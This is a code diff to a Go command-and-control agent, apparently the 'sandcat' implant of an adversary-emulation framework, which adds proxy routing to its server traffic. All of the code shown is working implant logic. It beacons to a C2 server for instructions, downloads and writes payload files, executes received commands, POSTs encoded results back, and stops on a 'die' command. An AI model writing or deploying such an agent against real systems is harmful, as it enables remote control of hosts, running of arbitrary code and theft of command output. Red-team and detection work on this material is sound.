@@ -6,6 +6,7 @@ import (
 	"fmt"
 	"io/ioutil"
 	"net/http"
+	"net/url"
 	"os"
 	"path/filepath"
 	"runtime"
@@ -24,9 +25,9 @@ func init() {
 }
 
 //Ping tests connectivity to the server
-func (contact API) Ping(server string) bool {
+func (contact API) Ping(server string, c2ProxyUrl *url.URL) bool {
 	address := fmt.Sprintf("%s/ping", server)
-	bites := request(address, nil)
+	bites := request(address, nil, c2ProxyUrl)
 	if(string(bites) == "pong") {
 		output.VerbosePrint("[+] Ping success")
 		return true;
@@ -39,7 +40,7 @@ func (contact API) Ping(server string) bool {
 func (contact API) GetInstructions(profile map[string]interface{}) map[string]interface{} {
 	data, _ := json.Marshal(profile)
 	address := fmt.Sprintf("%s/instructions", profile["server"])
-	bites := request(address, data)
+	bites := request(address, data, profile["c2Proxy"].(*url.URL))
 	var out map[string]interface{}
 	if bites != nil {
 		output.VerbosePrint("[+] beacon: ALIVE")
@@ -55,12 +56,12 @@ func (contact API) GetInstructions(profile map[string]interface{}) map[string]in
 }
 
 //DropPayloads downloads all required payloads for a command
-func (contact API) DropPayloads(payload string, server string, uniqueId string) []string{
+func (contact API) DropPayloads(payload string, server string, uniqueId string, c2ProxyUrl *url.URL) []string{
 	payloads := strings.Split(strings.Replace(payload, " ", "", -1), ",")
 	var droppedPayloads []string
 	for _, payload := range payloads {
 		if len(payload) > 0 {
-			droppedPayloads = append(droppedPayloads, drop(server, payload))
+			droppedPayloads = append(droppedPayloads, drop(server, payload, c2ProxyUrl))
 		}
 	}
 	return droppedPayloads
@@ -70,7 +71,7 @@ func (contact API) DropPayloads(payload string, server string, uniqueId string) 
 func (contact API) RunInstruction(command map[string]interface{}, profile map[string]interface{}, payloads []string) {
     timeout := int(command["timeout"].(float64))
 	cmd, result, status, pid := execute.RunCommand(command["command"].(string), payloads, profile["platform"].(string), command["executor"].(string), timeout)
-	sendExecutionResults(command["id"], profile["server"], result, status, cmd, pid)
+	sendExecutionResults(command["id"], profile["server"], result, status, cmd, pid, profile["c2Proxy"].(*url.URL))
 }
 
 //C2RequirementsMet determines if sandcat can use the selected comm channel
@@ -78,7 +79,7 @@ func (contact API) C2RequirementsMet(criteria interface{}) bool {
 	return true
 }
 
-func drop(server string, payload string) string {
+func drop(server string, payload string, c2ProxyUrl *url.URL) string {
 	location := filepath.Join(payload)
 	if len(payload) > 0 && util.Exists(location) == false {
 		output.VerbosePrint(fmt.Sprintf("[*] Downloading new payload: %s", payload))
@@ -86,7 +87,14 @@ func drop(server string, payload string) string {
 		req, _ := http.NewRequest("POST", address, nil)
 		req.Header.Set("file", payload)
 		req.Header.Set("platform", string(runtime.GOOS))
-		client := &http.Client{}
+
+        var client *http.Client = nil
+		if c2ProxyUrl != nil {
+            client = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(c2ProxyUrl)}}
+        } else {
+            client = &http.Client{}
+        }
+
 		resp, err := client.Do(req)
 		if err == nil && resp.StatusCode == ok {
 			util.WritePayload(location, resp)
@@ -95,20 +103,27 @@ func drop(server string, payload string) string {
 	return location
 }
 
-func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string) {
+func sendExecutionResults(commandID interface{}, server interface{}, result []byte, status string, cmd string, pid string, c2ProxyUrl *url.URL) {
 	address := fmt.Sprintf("%s/results", server)
 	link := fmt.Sprintf("%s", commandID.(string))
 	data, _ := json.Marshal(map[string]string{"id": link, "output": string(util.Encode(result)), "status": status, "pid": pid})
-	request(address, data)
+	request(address, data, c2ProxyUrl)
 	if cmd == "die" {
 		output.VerbosePrint("[+] Shutting down...")
 		util.StopProcess(os.Getpid())
 	}
 }
 
-func request(address string, data []byte) []byte {
+func request(address string, data []byte, c2ProxyUrl *url.URL) []byte {
 	req, _ := http.NewRequest("POST", address, bytes.NewBuffer(util.Encode(data)))
-	client := &http.Client{}
+
+	var client *http.Client = nil
+	if c2ProxyUrl != nil {
+	    client = &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(c2ProxyUrl)}}
+	} else {
+	    client = &http.Client{}
+	}
+
 	resp, err := client.Do(req)
 	if err != nil {
 		return nil
